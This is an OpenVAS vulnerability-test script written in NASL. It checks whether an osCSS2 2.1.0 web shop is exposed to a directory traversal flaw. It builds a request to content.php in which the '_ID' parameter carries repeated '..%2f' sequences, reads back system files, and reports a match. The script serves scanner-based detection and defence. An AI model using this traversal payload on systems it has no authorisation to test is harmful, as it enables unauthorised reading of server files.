###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_oscss_id_param_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# osCSS2 '_ID' parameter Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "osCSS2 version 2.1.0";
tag_insight = "The flaw is due to input validation error in 'id' parameter to
  'shopping_cart.php' and 'content.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.";
tag_solution = "Upgrade to osCSS2 svn branche 2.1.0 stable version or later
  For updates refer to http://download.oscss.org/";
tag_summary = "This host is running osCSS2 and is to prone directory traversal
  vulnerability.";

if(description)
{
  script_id(902763);
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-12-12 03:17:35 +0530 (Mon, 12 Dec 2011)");
  script_name("osCSS2 '_ID' parameter Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46741");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18099/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520421");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Nov/117");
  script_xref(name : "URL" , value : "http://www.rul3z.de/advisories/SSCHADV2011-034.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_oscss_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get oscss Installed Location
if(!dir = get_dir_from_kb(port:port, app:"osCSS")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/content.php?_ID=", crap(data:"..%2f",length:3*15),
               files[file]);

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file)){
    security_message(port:port);
  }
}
